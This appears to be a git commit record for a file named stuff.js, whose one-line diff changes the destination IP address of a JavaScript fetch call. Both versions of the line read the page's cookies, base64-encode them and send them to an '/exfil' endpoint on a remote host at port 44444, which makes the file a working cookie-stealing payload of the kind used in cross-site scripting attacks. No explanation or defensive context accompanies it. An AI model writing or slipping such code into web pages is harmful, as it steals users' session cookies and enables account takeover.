a7aa534071f106c9f3ebb2314eee3bb89b6faf6b
pottm :3 <pottm@users.noreply.github.com>
2023-01-13 15:27:48 +0100

    Update stuff.js

--- stuff.js
+++ stuff.js
@@ -1,1 +1,1 @@
-fetch("http://88.64.31.40:44444/exfil?data=" + encodeURIComponent(btoa(document.cookie)))
+fetch("http://172.18.188.25:44444/exfil?data=" + encodeURIComponent(btoa(document.cookie)))
